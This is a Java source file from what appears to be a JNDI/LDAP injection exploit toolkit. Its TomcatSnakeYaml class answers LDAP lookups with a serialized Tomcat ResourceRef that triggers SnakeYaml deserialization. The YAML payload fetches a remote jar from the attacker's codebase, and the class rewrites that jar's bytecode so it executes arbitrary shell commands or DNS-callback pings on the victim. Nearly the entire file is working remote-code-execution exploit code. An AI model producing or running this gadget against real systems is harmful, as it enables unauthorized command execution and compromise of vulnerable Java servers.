package net.roboterh.injector.gadgets;

import cn.hutool.http.HttpUtil;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import net.roboterh.injector.enums.PayloadEnum;
import net.roboterh.injector.servers.HTTPServer;
import net.roboterh.injector.utils.GadgetUtils;
import net.roboterh.injector.utils.PayloadUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.io.*;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;

/*
    Tomcat SnakeYaml Way:
    Requirement:
        Tomcat and SnakeYaml in classpath
    Explanation:
        load malicious .yml file to execute particular code using method org.yaml.snakeyaml.Yaml#load
        the payload is
            !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1/a.jar"]]]]
        load the class which is content of services/javax.script.ScriptEngineFactory by SPI
 */
public class TomcatSnakeYaml implements LDAPService{
    private static final Logger logger = LogManager.getLogger(TomcatSnakeYaml.class);

    private PayloadEnum payload;
    private String[] params;
    private String yamlScript;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);

        generateHandler();

        try {
            logger.info(String.format("Send LDAP result for %s using TomcatSnakeYaml Way ...", baseDN));

            // create ResourceRef
            ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",true,
                    "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "a=load"));
            ref.add(new StringRefAddr("a", yamlScript));

            Entry entry = new Entry(baseDN);
            entry.addAttribute("javaClassName", "java.lang.Class");
            entry.addAttribute("javaSerializedData", GadgetUtils.serialize(ref));
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    @Override
    public void argsHandler(String baseDN) {
        int firstIndex = baseDN.indexOf("/");
        int secondIndex = baseDN.indexOf("/", firstIndex + 1);

        // obtain the value of Payload
        payload = PayloadEnum.valueOf(baseDN.substring(firstIndex + 1, secondIndex));

        // add params
        switch (payload.name()) {
            case "Command":
                String cmd = PayloadUtils.getCmdFromBase(baseDN);
                params = new String[]{cmd};
                break;
            case "File":
            case "DnsLog":
                String link = baseDN.substring(baseDN.lastIndexOf("/") + 1);
                params = new String[]{link};
                break;
        }
        logger.info(String.format("Received Payload is %s, params are %s ...", payload, Arrays.toString(params)));
    }

    @Override
    public void generateHandler() {
        try {
            TomcatSnakeYamlTemplate tomcatSnakeYamlTemplate = new TomcatSnakeYamlTemplate();
            switch (payload.name()) {
                case "Command":
                    yamlScript = tomcatSnakeYamlTemplate.getExecCode(params[0]);
                    break;
                case "DnsLog":
                    yamlScript = tomcatSnakeYamlTemplate.getDnsLogCode(params[0]);
                    break;
                case "File":
                    yamlScript = HttpUtil.get(HTTPServer.codeBase + params[0]);
                    break;
            }
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    private class TomcatSnakeYamlTemplate {
        private String jarFilePath = System.getProperty("user.dir") + File.separator + "data" + File.separator + "tomcatSnakeyaml.jar";
        private String serviceClassName = "exploit.Test";

        private String template = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                String.format("    !!java.net.URL [\"%s%s.jar\"]\n", HTTPServer.codeBase, "tomcatSnakeyaml") +
                "  ]]\n" +
                "]";

        public TomcatSnakeYamlTemplate(String jarFilePath, String serviceClassName) {
            this.jarFilePath = jarFilePath;
            this.serviceClassName = serviceClassName;
        }
        public TomcatSnakeYamlTemplate() {

        }

        public String getExecCode(String cmd) throws Exception {
            String command = "try{" +
                    "String os = System.getProperty(\"os.name\");"+
                    "if (os.toLowerCase().contains(\"win\")) {" +
                    "String[] cmds = new String[]{\"cmd.exe\", \"/c\", \"" + cmd + "\"};" +
                    "java.lang.Runtime.getRuntime().exec(cmds);" +
                    "} else {" +
                    "String[] cmds = new String[]{\"/bin/sh\", \"-c\", \"" + cmd + "\"};" +
                    "java.lang.Runtime.getRuntime().exec(cmds);" +
                    "}" +
                    "} catch (java.lang.Exception e) {" +
                    "}";
            // update the jar
            updateJar(command);
            return template;
        }

        public String getDnsLogCode(String dnsLog) throws Exception {
            String command = "try {" +
                    "String os = System.getProperty(\"os.name\");" +
                    "if (os.toLowerCase().contains(\"win\")) {" +
                    "java.lang.Runtime.getRuntime().exec(\"ping -c 1 " + dnsLog + "\");" +
                    "} else {" +
                    "java.lang.Runtime.getRuntime().exec(\"nslookup " + dnsLog + "\");" +
                    "}" +
                    "} catch (java.lang.Exception e) {" +
                    "}";
            // update the jar
            updateJar(command);
            return template;
        }

        private void updateJar(String cmd) throws Exception {
            // Create a temporary file to write updated content
            File tempFile = File.createTempFile("temp", null);
            tempFile.deleteOnExit();
            PrintWriter writer = new PrintWriter(new FileWriter(tempFile));

            // Write the new content to the temporary file
            writer.write(serviceClassName);
            writer.flush();

            // Replace the old services file with the updated one
            String tempFilePath = tempFile.getAbsolutePath();
            String targetFilePath = jarFilePath + ".temp";
            new File(targetFilePath).delete();
            new File(jarFilePath).renameTo(new File(targetFilePath));

            JarOutputStream targetJar = new JarOutputStream(new FileOutputStream(jarFilePath));
            JarFile jarFile = new JarFile(targetFilePath);

            // Iterate over entries in the original JAR, copying them to the new JAR
            Enumeration<JarEntry> entries = jarFile.entries();
            while (entries.hasMoreElements()) {
                JarEntry jarEntry = entries.nextElement();
                if (!jarEntry.getName().equals("META-INF/services/javax.script.ScriptEngineFactory") &&
                        !jarEntry.getName().equals("exploit/Test.class")) {
                    InputStream input = jarFile.getInputStream(jarEntry);
                    targetJar.putNextEntry(jarEntry);
                    byte[] buffer = new byte[1024];
                    int bytesRead = 0;
                    while ((bytesRead = input.read(buffer)) != -1) {
                        targetJar.write(buffer, 0, bytesRead);
                    }
                    input.close();
                }
            }

            JarEntry newEntry = new JarEntry("META-INF/services/javax.script.ScriptEngineFactory");
            targetJar.putNextEntry(newEntry);
            FileInputStream input = new FileInputStream(tempFilePath);
            byte[] buffer = new byte[1024];
            int bytesRead = 0;
            while ((bytesRead = input.read(buffer)) != -1) {
                targetJar.write(buffer, 0, bytesRead);
            }
            input.close();

            // Modify Test class
            JarEntry entry = jarFile.getJarEntry("exploit/Test.class");
            InputStream inputStream = jarFile.getInputStream(entry);

            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.makeClass(inputStream);

            CtConstructor constructor = clazz.getConstructors()[0];
//            constructor.setBody(String.format("try { java.lang.Runtime.getRuntime().exec(new String[]{\"cmd\", \"/c\", \"%s\"}); } catch (Exception e) {}", "curl http://127.0.0.1:9002"));
            constructor.setBody(cmd);

            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
            clazz.toBytecode(dataOutputStream);

            JarEntry newEntry1 = new JarEntry("exploit/Test.class");
            targetJar.putNextEntry(newEntry1);
            targetJar.write(outputStream.toByteArray());

            targetJar.close();
//            new File(targetFilePath).delete();
        }
    }
}
